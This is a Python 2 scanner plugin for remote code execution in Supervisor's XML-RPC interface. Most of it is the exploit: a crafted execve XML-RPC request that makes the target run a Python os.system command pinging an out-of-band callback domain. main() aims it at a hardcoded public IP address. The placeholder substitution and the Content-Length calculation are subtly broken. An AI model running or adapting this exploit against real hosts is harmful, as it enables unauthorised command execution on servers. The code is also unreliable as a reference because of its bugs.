# coding:utf-8
# author:c4bbage
import socket


def get_plugin_info():
    plugin_info = {
        "name": "Supervisor 远程代码执行",
        "info": "Supervisor可通过web接口管理服务，在配置了web接口后，同时会在服务器启动一个 XMLRPC 服务器，端口为 9001。该接口可配置需要密码访问，或者无需认证访问。",
        "level": "高危",
        "type": "远程执行",
        "author": "c4bbage@dobest1",
        "url": "",
        "keyword": "tag:Supervisor",
        "source": 1
    }
    return plugin_info


def check(host, port, timeout, url):
    """
    @param
        host 
        port
        timout
        url: ceye.io
    """
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        payloadBody = """<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.execve</methodName>
<params>
<param>
<string>/usr/bin/python</string>
</param>
<param>
<array>
<data>
<value><string>python</string></value>
<value><string>-c</string></value>
<value><string>import os;os.system("ping [URL]")</string></value>
</data>
</array>
</param>
<param>
<struct>
</struct>
</param>
</params>
</methodCall>
"""

        payload = """POST /RPC2 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/xml
Content-Type: text/xml
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: [LEN] 
Host: [HOST] 

[Body]"""
        payload = payload.replace("[LEN]", str(len(payload))).replace(
            "[HOST]", "%s:%s" % (host, str(port))).replace("[Body]", payloadBody).replace("[url]", url)
        s.send(payload)
        print payload
        recData = s.recv(1024)
        s.close()
    except Exception, e:
        print e
        pass
def main():
    check("45.55.9.14",9001,10,"sqfuiz.exeye.io")

if __name__ == '__main__':
    main()